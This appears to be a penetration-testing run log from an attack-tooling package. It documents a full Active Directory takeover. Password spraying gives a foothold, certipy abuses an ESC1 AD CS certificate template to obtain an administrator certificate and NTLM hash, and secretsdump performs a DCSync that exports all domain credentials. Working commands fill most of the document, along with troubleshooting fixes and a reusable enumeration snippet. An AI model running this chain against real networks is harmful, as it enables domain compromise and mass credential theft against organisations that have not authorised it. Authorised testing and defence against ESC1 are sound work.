# [2026-03] AD CS ESC1 certificate template abuse → domain-admin privileges

## Scenario category
Penetration testing / AD attack

## Goal summary
Abuse an ESC1 certificate template in AD CS to obtain a domain-admin certificate as a standard domain user, then use DCSync to export all credentials.

## Full execution path

1. Obtain standard domain-user credentials through password spraying.
2. Enumerate the AD CS configuration with certipy.
   ```bash
   certipy find -u user@domain.local -p 'Password123' -dc-ip 10.0.0.1
   ```
3. Find an ESC1-vulnerable template (it allows any SAN and lets low-privilege users request certificates).
4. Request a certificate as the domain administrator.
   ```bash
   certipy req -u user@domain.local -p 'Password123' \
     -ca CORP-CA -template VulnTemplate \
     -upn administrator@domain.local -dc-ip 10.0.0.1
   ```
5. Authenticate with the certificate and obtain the NTLM hash.
   ```bash
   certipy auth -pfx administrator.pfx -dc-ip 10.0.0.1
   ```
6. Use DCSync to export all credentials.
   ```bash
   secretsdump.py domain.local/administrator@10.0.0.1 -hashes :NTLM_HASH
   ```

## Pitfall log

| Problem | Cause | Solution | Time |
|------|------|---------|------|
| certipy find timed out | A firewall blocked the LDAP connection | Use `-ns` to specify DNS | 20min |
| The certificate request was rejected | The template requires Manager Approval | Use another template that does not require approval | 10min |
| auth failed with KDC_ERR_PADATA | The DC clocks were not synchronized | Synchronize the clocks with ntpdate and retry | 5min |

## Toolchain findings
- certipy is the preferred AD CS attack tool. It is easier than Certify.exe because it is pure Python and runs directly on Kali.
- Ensure that DNS resolves correctly. Otherwise Kerberos authentication fails.

## Key code / commands
See the execution path above.

## Reusable patterns / script fragments
```bash
# Quick AD CS check
certipy find -u "$USER@$DOMAIN" -p "$PASS" -dc-ip "$DC" -stdout | grep -A5 "ESC"
```

## Improvement suggestions for this package
- certipy is already in the Kali bootstrap manifest.
- routing.md already has a "Certipy/AD CS" route.

## Evolution actions
- [x] No update needed (already covered)

## Environment information
- Kali 2026.1, certipy 4.8.2
- Target: Windows Server 2022 with AD CS deployed
- Domain functional level: 2016
